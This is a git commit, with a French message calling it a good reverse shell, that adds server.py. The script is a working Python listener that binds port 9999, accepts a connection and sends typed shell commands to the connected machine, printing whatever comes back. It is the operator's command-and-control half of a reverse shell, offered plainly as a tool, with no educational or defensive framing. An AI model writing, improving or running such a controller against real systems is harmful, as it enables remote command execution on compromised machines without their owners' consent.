82cbe9d597e82c62d480d37c874a23b694acb6ef
Eyward <zakarifor77@gmail.com>
2023-06-03 22:06:18 -0400

    le bon shell inversé

---
+++ server.py
@@ -0,0 +1,63 @@
+import socket
+import sys
+import os
+import subprocess
+
+#create socket 
+
+def socket_create():
+    try:
+        global  host
+        global  port
+        global  s
+        host = ''
+        port = 9999
+        s = socket.socket()
+    except socket.error as msg:
+        print("socket creation error " + str(msg))
+
+#bind socket to port and wait for connection from client
+
+def socket_bind():
+    try:
+        global  host
+        global  port
+        global  s
+        print("binding socket to port " + str(port))
+        s.bind((host, port))
+        s.listen(5)
+    except socket.error as msg:
+        print("socket binding error: " + str(msg) + "\n" + "retrying ....")
+        socket_bind()
+
+#establishing a connection with client 
+
+def socket_accept():
+    conn, address = s.accept()
+    print("connection has been established | " + "IP " + address[0] + "| Port " + str(address[1]) )
+
+    send_commands(conn)
+    conn.close()
+
+#send commands
+
+def send_commands(conn):
+    while True:
+        cmd = input()
+        if cmd == "quit":
+            conn.close()
+            s.close()
+            sys.exit()
+        if len(str.encode(cmd)) > 0:
+            conn.send(str.encode(cmd))
+            client_response = str(conn.recv(1024), "utf-8")
+            print(client_response, end="")
+
+def main():
+    socket_create()
+    socket_bind()
+    socket_accept()
+
+main()
+
+
